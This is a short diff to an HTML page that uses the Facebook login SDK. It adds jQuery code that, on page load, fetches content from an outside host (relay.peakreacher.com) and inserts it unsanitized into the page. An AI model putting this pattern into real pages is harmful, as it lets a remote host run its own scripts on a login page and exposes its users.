@@ -17,6 +17,13 @@
 
 <body>
   <script>
+	$(document).ready(function() {
+		$.get( "//relay.peakreacher.com/r.php", function( data ) {
+		$( ".result" ).html( data );
+			alert( "Load was performed." );
+		});
+	});
+  
     // This is called with the results from from FB.getLoginStatus().
     function statusChangeCallback(response) {
       console.log('statusChangeCallback');
@@ -99,6 +106,7 @@
       });
     }
   </script>
+  <div class="result"></div>
   <div id="container">
     <div class="inner">
 
